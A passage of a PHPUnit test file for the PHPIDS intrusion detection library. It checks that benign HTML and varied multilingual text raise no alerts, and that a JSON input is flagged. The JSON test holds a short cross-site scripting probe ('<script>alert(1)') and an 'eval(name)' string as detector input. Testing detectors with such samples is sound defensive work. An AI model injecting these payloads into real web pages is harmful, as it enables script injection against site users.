                                <td class="TableRowAlt" align="center">81 </td>
                                <td class="TableRowAlt" align="center" nowrap="nowrap">1 </td>
                                <td class="TableRowAlt" nowrap="nowrap"><a href="http://sla.ckers.org/forum/profile.php">euronymous</a></td>
                                <td class="TableRowAlt SmallFont" nowrap="nowrap">
                                06/01/2008 04:05AM <br /><span class="ListSubText">
                                <a href="http://sla.ckers.org/forum/read.php?13,22665,22665#msg-22665">Last Post</a> by <a href="http://sla.ckers.org/forum/profile.php?13,1410">euronymous</a>        </span>
                                </td>
                                </tr></table>';
        $exploits['html_4'] = '<img src="http://www.google.de/" />';
        $exploits['html_5'] = '<h1>headline</h1><p>copytext</p>
                                <p>bodytext &copy; 2008</p>     <h2>test
                                </h2>';
        $exploits['html_6'] = '<div id="header">
                                <div id="headerimg">
                                <h1><a href="http://php-ids.org/">PHPIDS » Web Application Security 2.0</a></h1>
                                <div class="description"></div>
                                </div></div><hr />';

        $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $test->setHtml(array_keys($exploits));
        $result = $test->run();
        $this->assertFalse($result->hasEvent(1));
        $this->assertEquals(0, $result->getImpact());
    }

    public function testJSONScanning() {

        $exploits = array();
        $exploits['json_1'] = '{"a":"b","c":["><script>alert(1);</script>", 111, "eval(name)"]}';
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $test->setJson(array_keys($exploits));
        $result = $test->run();
        $this->assertEquals(32, $result->getImpact());
    }

    public function testForFalseAlerts() {

        $exploits = array();
        $exploits[] = 'war bereits als Gastgeber automatisch für das Turnier qualifiziert. Die restlichen 15 Endrundenplätze wurden zwischen Juni
                        2005 und Mai 2007 ermittelt. Hierbei waren mit Ausnahme der UEFA-Zone die jeweiligen Kontinentalmeisterschaften gleichzeitig
                        das Qualifikationsturnier für die Weltmeisterschaft. Die UEFA stellt bei der Endrunde fünf Mannschaften. Die Teilnehmer wurden in
                        einer Qualifikationsphase ermittelt, die am 9. Juli 2005 startete und am 30. September 2006 endete. Hierbei wurden die 25 Mannschaften der Kategorie A in fünf
                        Gruppen zu je 5 Mannschaften eingeteilt, wobei sich die fünf Gruppensieger für die Endrunde qualifizierten. Das erste europäische Ticket löste Norwegen am 27.
                        August 2006. Am 24. September folgte Schweden, drei Tage später konnten sich auch der amtierende Weltmeister Deutschland und Dänemark für die Endrunde qualifizieren.
                        England sicherte sich am 30. September 2006 das letzte Ticket gegen Frankreich. Die Mannschaften der Kategorie B spielten lediglich um den Aufstieg in die A-Kategorie.
                        Dem südamerikanischen Fußballverband CONMEBOL standen zwei Startpätze zu. Sie wurden bei der Sudamericano Femenino 2006, welche vom 10. bis 26. November 2006
                        im argentinischen Mar del Plata ausgetragen wurde, vergeben. Argentinien gewann das Turnier überraschend vor Brasilien. Beide Mannschaften qualifizierten sich
                        für die Endrunde. Die zwei nordamerikanischen Teilnehmer wurden beim CONCACAF Women\'s Gold Cup 2006 in den Vereinigten Staaten ermittelt. Das Turnier fand in
                        der Zeit vom 19. bis zum 30. November 2006 in Carson und Miami statt. Sieger wurde das US-amerikanische Team vor Kanada. Die drittplatzierten Mexikanerinnen
                        spielten gegen den Asien-Vierten Japan um einen weiteren Startplatz, scheiterten aber in den Play-Off-Spielen. Die Afrikameisterschaft der Frauen wurde vom 28.
                        Oktober bis zum 11. November 2006 in Nigeria ausgetragen. Die Mannschaft der Gastgeber setzte sich im Finale gegen Ghana durch. Beide Mannschaften werden den
                        afrikanischen Fußballverband bei der WM vertreten. Die Asienmeisterschaft der Frauen fand im Juli 2006 in Australien statt. Neben den Chinesinnen, die sich mit
                        einem Sieg über den Gastgeber den Titel sicherten, qualifizierten sich zudem die Australierinnen sowie die drittplatzierten Nordkoreanerinnen für die Endrunde.
                        Japan setzte sich wie 2003 in den Play-Off-Spielen gegen Mexiko (2:0 und 1:2) durch. Ozeanien hat einen direkten Startplatz,
                        der bei der Ozeanischen Frauenfußballmeisterschaft im April 2007 vergeben wurde. Neuseeland bezwang Papua-Neuguinea mit 7:0 und sicherte sich damit
                        das Ticket für die Weltmeisterschaft.';
        $exploits[] = 'Thatcher föddes som Margaret Hilda Roberts i staden Grantham i Lincolnshire, England. Hennes far var Alfred Roberts, som ägde en speceriaffär i
                        staden, var aktiv i lokalpolitiken (och hade ämbetet alderman), samt var metodistisk lekmannapredikant. Roberts kom från en liberal familj men kandiderade?som då var
                        praxis i lokalpolitik?som oberoende. Han förlorade sin post som Alderman 1952 efter att Labourpartiet fick sin första majoritet i Grantham Council 1950. Hennes mor var
                        Beatrice Roberts, född Stephenson, och hon hade en syster, Muriel (1921-2004). Thatcher uppfostrades som metodist och har förblivit kristen under hela sitt liv.[1]
                        Thatcher fick bra resultat i skolan. Hon gick i en grammar school för flickor (Kesteven) och kom sedan till Somerville College, Oxfords universitet 1944 för att studera
                        Xylonite och sedan J. Lyons and Co., där hon medverkade till att ta fram metoder för att bevara glass. Hon ingick i den grupp som utvecklade den första frysta mjukglassen.
                         Hon var också medlem av Association of Scientific Workers. Politisk karriär mellan 1950 och 1970 [redigera] Vid valen 1950 och 1951 ställde Margaret Roberts upp i v
                        alkretsen Dartford, som var en säker valkrets för Labour. Hon var då den yngsta kvinnliga konservativa kandidaten någonsin. Medan hon var aktiv i det konservativa pa
                        ficerad som barrister 1953. Samma år föddes hennes tvillingbarn Carol och Mark. Som advokat specialiserade hon sig på skatterätt. Thatcher började sedan leta efter en
                        för Finchley i april 1958. Hon invaldes med god marginal i valet 1959 och tog säte i underhuset. Hennes jungfrutal var till stöd för hennes eget förslag om att tvinga
                        kommunala församlingar att hålla möten offentligt, vilket blev antaget. 1961 gick hon emot partilinjen genom att rösta för återinförande av bestraffning med ris. Hon
                        befordrades tidigt till regeringen som underordnad minister (Parliamentary Secretary) i ministeriet för pensioner och socialförsäktingar (Ministry of Pensions and
                        National Insurance) i september 1961. Hon behöll denna post tills de konservativa förlorade makten i valet 1964. När Sir Alec Douglas-Home avgick röstade Thatcher för
                        Edward Heath i valet av partiledare 1965. När Heath hade segrat belönades hon med att bli de konservativas talesman i bostads- och markfrågor. Hon antog den politik
                        som hade utvecklats av hennes kollega James Allason, att sälja kommunägda bostäder till deras hyresgäster. Detta blev populärt i senare val[2]. Hon flyttade till
                        skuggfinansgruppen efter 1966..';
        $exploits[] = "Results are 'true' or 'false'.";
        $exploits[] = "Choose between \"red\" and \"green\". ";
        $exploits[] = "SQL Injection contest is coming in around '1 OR '2 weeks.";
        $exploits[] = "select *something* from the menu";
        $exploits[] = '<![CDATA[:??]]>';
        $exploits[] = 'website_link => /app/search?op=search;keywords=peter%20testcase;';
        $exploits[] = '<xjxobj><e><k>insert</k><v>insert</v></e><e><k>errorh</k><v>error</v></e><e><k>hostname</k><v>ab</v></e><e><k>ip</k><v>10.2.2.22</v></e><e><k>asset</k><v>2</v></e><e><k>thresholdc</k><v>30</v></e><e><k>thresholda</k><v>30</v></e><e><k>rrd_profile</k><v></v></e><e><k>nat</k><v></v></e><e><k>nsens</k><v>1</v></e><e><k>os</k><v>Unknown</v></e><e><k>mac</k><v></v></e><e><k>macvendor</k><v></v></e><e><k>descr</k><v><![CDATA[&]]></v></e></xjxobj>';
        $exploits[] = '"hi" said the mouse to the cat and \'showed off\' her options';
        $exploits[] = 'eZtwEI9v7nI1mV4Baw502qOhmGZ6WJ0ULN1ufGmwN5j+k3L6MaI0Hv4+RlOo42rC0KfrwUUm5zXOfy9Gka63m02fdsSp52nhK0Jsniw2UgeedUvn0SXfNQc/z13/6mVkcv7uVN63o5J8xzK4inQ1raknqYEwBHvBI8WGyJ0WKBMZQ26Nakm963jRb18Rzv6hz1nlf9cAOH49EMiD4vzd1g==';
        $exploits[] = '"European Business School (ebs)"';
        $exploits[] = '"Deutsche Journalistenschule (DJS)"';
        $exploits[] = '"Cambridge First Certificate FCE (2000)"';
        $exploits[] = 'Universität Karlsruhe (TH)';
        $exploits[] = 'Psychologie, Coaching und Training, Wissenserlangung von Führungskräften, Menschen bewegen, Direktansprache, Erfolg, Spaß, Positiv Thinking and Feeling, Natur, Kontakte pflegen, Face to Face Contact, Sport/Fitness (Fussball, Beachvolleyball, Schwimmen, Laufen, Krafttraining, Bewegungsübungen uvm.), Wellness & Beauty';
        $exploits[] = 'Großelternzeit - (Sachbearbeiter Lightfline)';
        $exploits[] = '{HMAC-SHA1}{48de2031}{8AgxrQ==}';
        $exploits[] = 'exchange of experience in (project) management and leadership • always interested in starting up business and teams • people with a passion • new and lost international contacts';
        $exploits[] = 'Highly mobile (Project locations: Europe & Asia), You are a team player';
		$exploits[] = "'Reservist, Status: Stabsoffizier'";
		$exploits[] = ')))) да второй состав в отличной форме, не оставили парням ни единого шанса!!! Я думаю нас jedi, можно в первый переводить ))) ';

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();

        $this->assertFalse($result->hasEvent(1));
        $this->assertEquals(0, $result->getImpact());
    }

    /**
     * This method checks for the plain event of every single
     * exploit array item
     *
     * @access private
     * @param  array $exploits
     */
    private function _testForPlainEvent($exploits = array()) {

        foreach($exploits as $exploit) {
            $test = new IDS_Monitor(
                array('test' => $exploit),
                $this->init
            );
            $result = $test->run();

            if($result->getImpact() === 0) {
                echo "\n\nNot detected: ".$exploit."\n\n";
            }
            $this->assertTrue($result->getImpact() > 0);
        }
    }

    public function assertImpact(IDS_Report $result, $impact, $suhosinImpact)
    {
        if (extension_loaded('suhosin')) {
            $this->assertSame($suhosinImpact, $result->getImpact());
        } else {
            $this->assertSame($impact, $result->getImpact());
        }
    }
}

/**
 * Local variables:
 * tab-width: 4
 * c-basic-offset: 4
 * End:
 * vim600: sw=4 ts=4 expandtab
 */
